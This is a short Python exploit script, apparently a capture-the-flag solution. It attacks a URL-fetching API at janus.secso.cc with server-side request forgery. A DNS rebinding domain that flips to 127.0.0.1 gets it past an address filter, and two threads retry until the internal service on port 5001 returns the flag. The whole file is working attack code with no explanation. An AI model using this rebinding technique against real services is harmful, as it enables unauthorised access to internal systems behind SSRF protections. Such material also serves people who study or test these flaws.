import requests
import threading
import sys
import time

BASE_URL = "http://janus.secso.cc/api"
REBINDING_DOMAIN = "03af7344.7f000001.rbndr.us"
INTERNAL_PORT = 5001
NUM_THREADS = 2

INTERNAL_URL = f"http://{REBINDING_DOMAIN}:{INTERNAL_PORT}/"
TARGET_URL = f"{BASE_URL}?url={INTERNAL_URL}"

flag_found_event = threading.Event()

def exploit_worker():
    while not flag_found_event.is_set():
        try:
            response = requests.get(TARGET_URL, timeout=30)
            if response.status_code == 200:
                if not flag_found_event.is_set():
                    print(response.text)
                    flag_found_event.set()
                    break 

            elif response.status_code == 403:
                sys.stdout.write('F') 
                sys.stdout.flush()

            elif response.status_code == 502:
                sys.stdout.write('B') 
                sys.stdout.flush()
            
            else:
                sys.stdout.write('?')
                sys.stdout.flush()

        except requests.exceptions.RequestException:
            sys.stdout.write('E') # E for Error
            sys.stdout.flush()

if __name__ == "__main__":
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=exploit_worker)
        threads.append(thread)
        thread.start()
    try:
        while not flag_found_event.wait(timeout=0.5): 
            pass
    except KeyboardInterrupt:
        flag_found_event.set()

    for thread in threads:
        thread.join()
